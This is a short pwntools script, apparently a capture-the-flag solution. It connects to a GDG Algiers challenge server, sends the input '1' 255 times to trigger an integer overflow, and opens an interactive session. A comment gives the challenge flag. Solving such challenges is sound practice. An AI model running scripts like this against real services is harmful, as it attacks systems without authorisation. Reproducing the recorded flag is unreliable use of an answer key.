from pwn import *
import time

r = remote('pwn.chal.ctf.gdgalgiers.com', 1402)

for _ in range(255):
    r.sendline(b'1')
    time.sleep(0.1)

r.interactive() # CyberErudites{1NtegeR_0v3rfloWS_ar3_Na$ty}
